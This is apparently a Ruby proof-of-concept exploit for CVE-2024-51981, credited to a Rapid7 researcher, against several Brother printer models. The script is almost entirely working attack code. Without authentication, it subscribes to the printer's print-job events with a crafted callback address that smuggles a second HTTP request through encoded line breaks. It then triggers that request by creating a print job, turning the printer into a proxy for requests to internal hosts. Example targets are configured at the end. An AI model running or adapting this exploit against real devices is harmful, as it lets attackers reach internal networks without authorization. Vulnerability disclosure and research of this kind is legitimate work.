# frozen_string_literal: true
# =====================================================================================================
# CVE-2024-51981: An unauthenticated attacker can force the device to perform an arbitrary HTTP request
# =====================================================================================================
#
# Verified on the following:
# * Brother MFC-L9570CDW (MAIN: ZL2403011354, SUB1: 1.32)
# * Brother MFC-L9570CDW (MAIN: ZK2309081840, SUB1: 1.31)
# * Brother DCP-L2530DW (MAIN: Z2206231358,  SUB5: 1.04)
# * Brother DCP-L2530DW (MAIN: ZB2310101756,  SUB5: 1.04)
#
# Example usage:
#   gem install httparty
#   ruby CVE-2024-51981.rb
#
# Credit: Stephen Fewer, Principal Security Researcher at Rapid7
# =====================================================================================================
require 'httparty'
require 'cgi'
require 'securerandom'

HTTParty::Basement.default_options.update(verify: false)

class BrotherSSRF
	def initialize(printer_scheme, printer_ip, printer_port, printer_soap_endpoint)

		@printer_soap_url = "#{printer_scheme}://#{printer_ip}:#{printer_port}#{printer_soap_endpoint}"

		@soap_eventing_subscribe_identifier_uuid = nil

		@jobid = nil
	end
	
	def perform_request(scheme, ip, port=80, method='GET', path='/', query_params={}, headers={}, body='')
	
		ssrf_wsaaddress = make_ssrf_wsaaddress(scheme, ip, port, method, path, query_params, headers, body)
	
		$stdout.puts "[+] Using the following wsa:Address to perform SSRF:"
		
		$stdout.puts ssrf_wsaaddress
		
		$stdout.puts "[+] Setting up SSRF callabck via JobStatusEvent event subscription..."
	
		return false unless do_subscribe(ssrf_wsaaddress)
		
		$stdout.puts "[+] Triggering SSRF via create print job request..."
	
		return false unless do_createprintjob

		$stdout.puts "[+] Cleaning up, removing JobStatusEvent event subscription..."
		
		return false unless do_unsubscribe
		
		$stdout.puts "[+] Cleaning up, removing print job..."

		return false unless do_cancelprintjob
				
		$stdout.puts "[+] Finished."
		
		true
	end

	def make_ssrf_wsaaddress(scheme, ip, port, method, path, query_params, headers, body)
		
		query_string = String.new
		
		unless query_params.empty?
			query_string << '?'
			
			query_params.each do |k, v|
				query_string << '&amp;' unless query_string.empty?

				query_string << "#{CGI.escape(k)}=#{CGI.escape(v)}"
			end
		end
		
		headers = {
			'Content-Type' => 'text/plain',
			'Content-Length' => body.length,
			'Connection' => 'close'
		}.merge(headers)
		
		
		data = String.new
		
		data << "#{scheme}://#{ip}:#{port}/thisdoesntexistandwillbea404 HTTP/1.1"
		data << "&#xD;&#xA;"
		data << "Connection: keep-alive"
		data << "&#xD;&#xA;"
		data << "Content-Length: 0"
		data << "&#xD;&#xA;"
		data << "&#xD;&#xA;"
		
		data << "#{method} #{path}#{query_string} HTTP/1.1"
		data << "&#xD;&#xA;"		
		headers.each do |k, v|
			data << "#{k}: #{v}"
			data << "&#xD;&#xA;"
		end		
		data << "&#xD;&#xA;"
		data << body
	end

	def do_soap_request(request_xml)
		response = HTTParty.post(@printer_soap_url, body: request_xml, headers: { 'Content-Type' => 'application/soap+xml' })

		if response&.code.to_i != 200
			$stderr.puts response&.body
			$stderr.puts "do_soap_request -> #{response&.code}"
			return nil
		end

		response.body
	end

	def do_subscribe(ssrf_wsaaddress)
		request_xml = %{<?xml version="1.0" encoding="UTF-8"?>
		<SOAP-ENV:Envelope
			xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
			xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
			xmlns:wse="http://schemas.xmlsoap.org/ws/2004/08/eventing">
			<SOAP-ENV:Header>
				<wsa:ReplyTo>
					<wsa:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
				</wsa:ReplyTo>
				<wsa:To>http://schemas.xmlsoap.org/ws/2004/08/eventing/Subscribe</wsa:To>
				<wsa:Action>http://schemas.xmlsoap.org/ws/2004/08/eventing/Subscribe</wsa:Action>
				<wsa:MessageID>urn:uuid:#{SecureRandom.uuid}</wsa:MessageID>
			</SOAP-ENV:Header>
			<SOAP-ENV:Body>
				<wse:Subscribe>
					<wse:Delivery>
						<wse:NotifyTo>
						<wsa:Address>#{ssrf_wsaaddress}</wsa:Address>
						</wse:NotifyTo>
					</wse:Delivery>
					<wse:Expires>P1D</wse:Expires>
					<wse:Filter>http://schemas.microsoft.com/windows/2006/08/wdp/print/JobStatusEvent</wse:Filter>
				</wse:Subscribe>
			</SOAP-ENV:Body>
		</SOAP-ENV:Envelope>}

		response_body = do_soap_request(request_xml)

		return false if response_body.nil?

		identifier_match = response_body.match(/<wse:Identifier>urn:uuid:(\S+)<\/wse:Identifier>/)
		if identifier_match&.length != 2
			$stderr.puts response_body
			$stderr.puts "Subscribe Identifier fail"
			return false
		end

		@soap_eventing_subscribe_identifier_uuid = identifier_match[1]

		true
	end

	def do_createprintjob
		request_xml = %{<?xml version="1.0" encoding="UTF-8"?>
		<SOAP-ENV:Envelope
			xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
			xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
			xmlns:wprt="http://schemas.microsoft.com/windows/2006/08/wdp/print">
			<SOAP-ENV:Header>
				<wsa:ReplyTo>
					<wsa:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
				</wsa:ReplyTo>
				<wsa:To>http://schemas.microsoft.com/windows/2006/08/wdp/print/CreatePrintJob</wsa:To>
				<wsa:Action>http://schemas.microsoft.com/windows/2006/08/wdp/print/CreatePrintJob</wsa:Action>
				<wsa:MessageID>urn:uuid:#{SecureRandom.uuid}</wsa:MessageID>
			</SOAP-ENV:Header>
			<SOAP-ENV:Body>
				<wprt:CreatePrintJobRequest>
					<wprt:PrintTicket>
						<wprt:JobDescription>
							<wprt:JobName>test1</wprt:JobName>
							<wprt:JobOriginatingUserName>user1</wprt:JobOriginatingUserName>
						</wprt:JobDescription>
					</wprt:PrintTicket>
				</wprt:CreatePrintJobRequest>
			</SOAP-ENV:Body>
		</SOAP-ENV:Envelope>}

		response_body = do_soap_request(request_xml)

		return false if response_body.nil?

		jobid_match = response_body.match(/<wprt:JobId>(\d+)<\/wprt:JobId>/)
		if jobid_match&.length != 2
			$stderr.puts response_body
			$stderr.puts "JobId regex fail"
			return false
		end

		@jobid = jobid_match[1]

		true
	end
	
	def do_unsubscribe
		request_xml = %{<?xml version="1.0" encoding="UTF-8"?>
		<SOAP-ENV:Envelope
			xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
			xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
			xmlns:wse="http://schemas.xmlsoap.org/ws/2004/08/eventing">
			<SOAP-ENV:Header>
				<wsa:ReplyTo>
					<wsa:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
				</wsa:ReplyTo>
				<wsa:To>http://schemas.xmlsoap.org/ws/2004/08/eventing/Unsubscribe</wsa:To>
				<wsa:Action>http://schemas.xmlsoap.org/ws/2004/08/eventing/Unsubscribe</wsa:Action>
				<wsa:MessageID>urn:uuid:#{SecureRandom.uuid}</wsa:MessageID>
				<wse:Identifier>urn:uuid:#{@soap_eventing_subscribe_identifier_uuid}</wse:Identifier>
			</SOAP-ENV:Header>
			<SOAP-ENV:Body>
				<wse:Unsubscribe/>
			</SOAP-ENV:Body>
		</SOAP-ENV:Envelope>}

		!do_soap_request(request_xml).nil?
	end

	def do_cancelprintjob
		request_xml = %{<?xml version="1.0" encoding="UTF-8"?>
		<SOAP-ENV:Envelope
			xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
			xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
			xmlns:wprt="http://schemas.microsoft.com/windows/2006/08/wdp/print">
			<SOAP-ENV:Header>
				<wsa:ReplyTo>
					<wsa:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
				</wsa:ReplyTo>
				<wsa:To>http://schemas.microsoft.com/windows/2006/08/wdp/print/CancelJob</wsa:To>
				<wsa:Action>http://schemas.microsoft.com/windows/2006/08/wdp/print/CancelJob</wsa:Action>
				<wsa:MessageID>urn:uuid:#{SecureRandom.uuid}</wsa:MessageID>
			</SOAP-ENV:Header>
			<SOAP-ENV:Body>
				<wprt:CancelJobRequest>
					<wprt:JobId>#{@jobid}</wprt:JobId>
				</wprt:CancelJobRequest>
			</SOAP-ENV:Body>
		</SOAP-ENV:Envelope>}

		!do_soap_request(request_xml).nil?
	end
end

# Configure the target printer.
ssrf = BrotherSSRF.new(
	'http',
	'192.168.86.62', 
	80,
	'/WebServices/PrinterService'
)

# Configure an internal IP address to perfrom an HTTP request to (via the target printer).
ssrf.perform_request(
	'http', 
	'192.168.86.35',
	4444,
	'GET',
	'/hax', 
	{
		'param1' => '1111',
		'param2' => '2222'
	}, 
	{},
	'TESTING12345'
)

# Configure an internal IP address to perfrom a second HTTP request to (via the target printer).
ssrf.perform_request(
	'http', 
	'192.168.86.35',
	4444,
	'GET', 
	'/hax', 
	{
		'param1' => 'AAAA',
		'param2' => 'BBBB'
	}, 
	{},
	'HELLO WORLD!'
)
